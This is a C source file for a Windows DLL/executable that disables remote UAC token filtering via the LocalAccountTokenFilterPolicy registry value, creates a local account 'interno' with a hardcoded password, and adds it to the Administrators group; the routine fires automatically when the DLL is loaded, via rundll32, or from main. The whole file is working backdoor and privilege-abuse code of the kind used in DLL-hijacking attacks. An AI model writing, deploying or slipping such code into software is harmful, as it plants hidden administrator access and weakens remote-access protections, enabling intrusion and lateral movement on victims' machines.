/*
 * ADDUSER_UAC.C: It disables default remote UAC policy and creates a new admin user
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <sddl.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <string.h>
#include <tchar.h>

//#pragma comment(lib, "advapi32.lib")
//#pragma comment(lib, "netapi32.lib")

#define NEW_USERNAME    _T("interno")
#define NEW_PASSWORD    _T("oiAaujVMBal58dagSbdFSiXT")

#define LOCAL_ADMIN_SID _T("S-1-5-32-544")

#define REGKEY_POLICIES_SYSTEM _T("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
#define REGVAL_FILTER_POLICY   _T("LocalAccountTokenFilterPolicy")

BOOL DisableRemoteUAC(void)
{
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY_POLICIES_SYSTEM, 0, KEY_ALL_ACCESS, &hKey);

    if (lResult != ERROR_SUCCESS) {
        lResult = RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGKEY_POLICIES_SYSTEM, 0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS, NULL, &hKey, NULL);
    }

    if (lResult == ERROR_SUCCESS) {
        DWORD dwData = 1;
        lResult = RegSetValueEx(hKey, REGVAL_FILTER_POLICY, 0, REG_DWORD, (LPBYTE)&dwData, sizeof(dwData));
        RegCloseKey(hKey);
    }

    return (lResult == ERROR_SUCCESS);
}

DWORD CheckUserAccount(LPCWSTR lpUsername) {
    USER_INFO_1 *pBuf = NULL;
    DWORD dwLevel = 1;
    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    NET_API_STATUS nStatus;

    nStatus = NetUserGetInfo(NULL, lpUsername, dwLevel, (LPBYTE*)&pBuf);
    if (nStatus != NERR_Success) {
        //_tprintf(_T("NetUserGetInfo error: 0x%08x\n"), nStatus);
        return nStatus;
    }

    NetApiBufferFree(pBuf);
    return nStatus;
}

DWORD CreateLocalUserAccount(LPWSTR lpUsername, LPWSTR lpPassword)
{
    NET_API_STATUS nStatus;
    USER_INFO_1 uInfo;

    memset(&uInfo, 0, sizeof(uInfo));

    uInfo.usri1_name        = lpUsername;
    uInfo.usri1_password    = lpPassword;
    uInfo.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    uInfo.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    uInfo.usri1_script_path = NULL;

    nStatus = NetUserAdd(NULL, 1, (LPBYTE)&uInfo, NULL);

    if (nStatus != NERR_Success) {
        _tprintf(_T("NetUserAdd error: 0x%08x\n"), nStatus);
    }

    return nStatus;
}

DWORD PromoteToLocalAdmin(LPCTSTR lpUsername)
{
    PSID pAdminSid, pUserSid;
    LPTSTR lpGroupName = NULL;
    LPTSTR lpDomain = NULL;
    DWORD cbGroupName = 0;
    DWORD cbDomain = 0;

    SID_NAME_USE SidType;

    LOCALGROUP_MEMBERS_INFO_0 gmAdmins;
    DWORD cbUserSid = SECURITY_MAX_SID_SIZE;
    DWORD dwLastErr = 0;
    BOOL bSuccess;

    NET_API_STATUS nStatus;

    // Initialize the SID
    if (!ConvertStringSidToSid(LOCAL_ADMIN_SID, &pAdminSid)) {
        dwLastErr = GetLastError();
        _tprintf(_T("ConvertStringSidToSid error: 0x%08x\n"), dwLastErr);
        return dwLastErr;
    }

    // Get the group name associated with the SID
    if (!LookupAccountSid(NULL, pAdminSid, lpGroupName, &cbGroupName, lpDomain, &cbDomain, &SidType)) {
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            lpGroupName = malloc(cbGroupName * sizeof(TCHAR));
            lpDomain = malloc(cbDomain * sizeof(TCHAR));
            if (!LookupAccountSid(NULL, pAdminSid, lpGroupName, &cbGroupName, lpDomain, &cbDomain, &SidType)) {
                dwLastErr = GetLastError();
                _tprintf(_T("LookupAccountSid error: 0x%08x\n"), dwLastErr);
                return dwLastErr;
            }
        } else {
            dwLastErr = GetLastError();
            _tprintf(_T("LookupAccountSid error: 0x%08x\n"), dwLastErr);
            return dwLastErr;
        }
    }

    // For LookupAccountName() lpDomain should now be the machine name, but we'll ignore that
    cbDomain = 256;
    lpDomain = realloc(lpDomain, cbDomain * sizeof(TCHAR));

    pUserSid = LocalAlloc(LPTR, cbUserSid);
    if (pUserSid == NULL) {
        dwLastErr = GetLastError();
        _tprintf(_T("LocalAlloc error: 0x%08x\n"), dwLastErr);
        return dwLastErr;
    }

    // Get the user SIDs
    bSuccess = LookupAccountName(
        NULL,           // local server
        lpUsername,     // account name
        pUserSid,       // SID
        &cbUserSid,     // SID size
        lpDomain,       // Domain
        &cbDomain,      // Domain size
        &SidType        // SID_NAME_USE (enum)
    );

    if (!bSuccess) {
        dwLastErr = GetLastError();
        _tprintf(_T("LookupAccountName error: 0x%08x\n"), dwLastErr);
        return dwLastErr;
    }

    // Add user to "Administrators" local group
    memset(&gmAdmins, 0, sizeof(gmAdmins));
    gmAdmins.lgrmi0_sid = pUserSid;
    nStatus = NetLocalGroupAddMembers(NULL, lpGroupName, 0, (LPBYTE)&gmAdmins, 1);

    // Free the memory
    LocalFree(pAdminSid);
    LocalFree(pUserSid);
    free(lpGroupName);
    free(lpDomain);

    if (nStatus != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers error: 0x%08x\n"), nStatus);
        return nStatus;
    }

    return 0;
}

DWORD Deploy(void)
{
    DisableRemoteUAC();

    if (CheckUserAccount(NEW_USERNAME) != NERR_Success) {
        //_tprintf(_T("User does not exist, creating new account...\n"));
        CreateLocalUserAccount(NEW_USERNAME, NEW_PASSWORD);
    }

    //_tprintf(_T("Promoting user to local admin\n"));
    return PromoteToLocalAdmin(NEW_USERNAME);
}

//
// DLL entry point.
//
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Deploy();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//
// RUNDLL32 entry point.
// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
//

#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    Deploy();
}

#ifdef __cplusplus
}
#endif

//
// Command-line entry point.
//
int main()
{
    return Deploy();
}
